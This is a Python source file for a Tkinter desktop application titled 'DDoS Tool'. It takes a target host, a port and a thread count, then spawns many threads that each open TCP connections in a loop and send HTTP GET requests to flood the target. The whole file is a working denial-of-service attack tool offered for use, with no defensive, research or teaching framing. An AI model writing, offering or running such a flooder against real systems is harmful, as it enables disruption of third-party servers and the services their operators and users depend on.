import socket
import threading
import tkinter as tk
from tkinter import messagebox
import time

class DDoSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("DDoS Tool")
        self.root.geometry("400x300")

        self.label_target = tk.Label(root, text="Target IP/Domain:")
        self.label_target.pack(pady=10)
        self.entry_target = tk.Entry(root, width=30)
        self.entry_target.pack(pady=10)

        self.label_port = tk.Label(root, text="Port (default 80):")
        self.label_port.pack(pady=10)
        self.entry_port = tk.Entry(root, width=10)
        self.entry_port.insert(0, "80")
        self.entry_port.pack(pady=10)

        self.label_threads = tk.Label(root, text="Number of Threads:")
        self.label_threads.pack(pady=10)
        self.entry_threads = tk.Entry(root, width=10)
        self.entry_threads.insert(0, "100")
        self.entry_threads.pack(pady=10)

        self.start_button = tk.Button(root, text="Start Attack", command=self.start_attack)
        self.start_button.pack(pady=20)

        self.status_label = tk.Label(root, text="Status: Idle")
        self.status_label.pack(pady=10)

        self.running = False

    def attack(self, target, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode('ascii'), (target, port))
                s.close()
                self.status_label.config(text=f"Status: Attacking {target}")
            except:
                s.close()

    def start_attack(self):
        if self.running:
            messagebox.showinfo("Info", "Attack already running!")
            return

        target = self.entry_target.get()
        try:
            port = int(self.entry_port.get())
            num_threads = int(self.entry_threads.get())
        except ValueError:
            messagebox.showerror("Error", "Port and Threads must be numbers!")
            return

        if not target:
            messagebox.showerror("Error", "Enter a target IP or domain!")
            return

        self.running = True
        self.start_button.config(state="disabled")
        self.status_label.config(text=f"Status: Starting attack on {target}")

        for _ in range(num_threads):
            thread = threading.Thread(target=self.attack, args=(target, port))
            thread.start()
            time.sleep(0.01)

        messagebox.showinfo("Info", f"Attack launched on {target} with {num_threads} threads!")

    def stop(self):
        self.running = False
        self.start_button.config(state="normal")
        self.status_label.config(text="Status: Idle")

if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSApp(root)
    root.protocol("WM_DELETE_WINDOW", lambda: [app.stop(), root.destroy()])
    root.mainloop()